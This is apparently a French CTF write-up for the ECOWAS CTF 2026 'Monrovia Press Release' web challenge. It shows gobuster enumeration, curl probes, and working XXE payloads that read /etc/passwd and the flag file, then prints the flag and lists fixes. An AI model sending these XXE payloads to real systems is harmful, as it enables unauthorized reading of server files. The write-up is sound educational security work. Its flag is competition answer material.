---
layout: post
title: "ECOWAS CTF 2026 — Monrovia Press Release [Web/XXE]"
date: 2026-04-24 09:20:00 +0000
categories: [CTF, ECOWAS-CTF-2026]
tags: [web, xxe, xml, injection, curl, gobuster, werkzeug]
toc: true
---

> **CTF :** ECOWAS CTF 2026 · **Catégorie :** Web · **Difficulté :** ⭐⭐ (Medium) · **Points :** 200  
> **[← Retour à l'index du CTF](/portfolio/blog/posts/ecowas-ctf-2026/)**

---

> **Writeup par : 0xWhoAm1** — Équipe **DarkPulse**

---

## Description du challenge

Un service web exposé sur le port 5007. L'application est un système de soumission de communiqués de presse pour Monrovia (capitale du Liberia).

![Challenge Monrovia Press Release](/assets/img/ecowas-2026/lion/monrovia-challenge.png)

---

## Reconnaissance initiale

### Rendu du site

![Rendu du site](/assets/img/ecowas-2026/lion/monrovia-site.png)

### Code source de la page

On inspecte le code source HTML dans le navigateur (clic droit → View Source) :

![Code source de la page](/assets/img/ecowas-2026/lion/monrovia-source.png)

---

## Étape 1 — Énumération des endpoints (gobuster)

On utilise **Gobuster** pour découvrir les endpoints cachés :

```bash
gobuster dir \
  -u http://labs.ecowasctf.com.gh:5007/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![Résultat gobuster](/assets/img/ecowas-2026/lion/monrovia-gobuster.png)

Seul l'endpoint `/submit` est découvert.

---

## Étape 2 — Sonder l'endpoint `/submit`

### Test GET

```bash
curl http://labs.ecowasctf.com.gh:5007/submit
```

![Réponse GET sur /submit](/assets/img/ecowas-2026/lion/monrovia-curl-get.png)

La réponse indique que GET n'est pas supporté sur cet endpoint.

### Découverte des méthodes HTTP supportées

```bash
curl -X OPTIONS http://labs.ecowasctf.com.gh:5007/submit -i
```

![Méthodes supportées](/assets/img/ecowas-2026/lion/monrovia-options.png)

### Test POST avec JSON (sondage du format attendu)

```bash
curl -i -X POST http://labs.ecowasctf.com.gh:5007/submit \
  -H "Content-Type: application/json" \
  -d '{"input":"test"}'
```

**Réponse :**

```
HTTP/1.1 400 BAD REQUEST
Server: Werkzeug/3.1.8 Python/3.11.15

{"error":"parse failed: Start tag expected, '<' not found, line 1, column 1 (<string>, line 1)"}
```

**Analyse critique :** Le message d'erreur `Start tag expected, '<' not found` trahit le serveur — il essaie de **parser le body comme du XML**. L'erreur vient d'un parseur XML qui reçoit du JSON.

---

## Étape 3 — Confirmation XML et XXE

### Test POST avec XML valide

```bash
curl -i -X POST http://labs.ecowasctf.com.gh:5007/submit \
  -H "Content-Type: application/xml" \
  -d '<root><input>test</input></root>'
```

**Réponse :**

```
HTTP/1.1 200 OK
{"body":"","title":""}
```

Le serveur répond 200. Il parse bien du XML et extrait les champs `title` et `body`. Avec un parseur XML qui reflète des données, on peut tenter **XXE** ([XML External Entity Injection](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)).

> **XXE** : quand un parseur XML résout des entités externes (`ENTITY xxe SYSTEM "file://..."`), il peut lire des fichiers locaux ou faire des requêtes réseau côté serveur.

---

## Étape 4 — Exploitation XXE

### Lecture de `/etc/passwd`

```bash
curl -i -X POST http://labs.ecowasctf.com.gh:5007/submit \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <input>&xxe;</input>
</root>'
```

Le contenu de `/etc/passwd` est retourné dans la réponse — XXE confirmé.

### Lecture du flag

```bash
curl -i -X POST http://labs.ecowasctf.com.gh:5007/submit \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<root>
  <input>&xxe;</input>
</root>'
```

![Flag via XXE](/assets/img/ecowas-2026/lion/monrovia-xxe-flag.png)

---

## Flag

```
EcowasCTF{m0nr0v14_xx3_news_l34k_2026}
```

---

## Résumé de la chaîne d'exploitation

```
1. Gobuster → découvre /submit
2. POST JSON → erreur XML parser (révèle le format attendu)
3. POST XML valide → 200 OK (confirme le parsing XML)
4. Payload XXE SYSTEM → lecture de fichiers locaux
5. /flag.txt → flag
```

## Leçons apprises

| Vecteur | Indicateur | Correction |
|---------|-----------|-----------|
| XXE | Message d'erreur `Start tag expected` sur un POST JSON | Désactiver les entités externes dans le parseur XML |
| Disclosure d'erreur | Stack trace Werkzeug visible | Désactiver le mode debug en production |
| Endpoint discovery | `/submit` non lié depuis la page principale | Utiliser des noms d'endpoints non prévisibles |

La clé ici était l'**erreur révélatrice** : le message d'erreur du parseur XML exposé en 400 a immédiatement confirmé que le backend attendait du XML. Sans ce message, on aurait peut-être essayé du JSON plus longtemps.
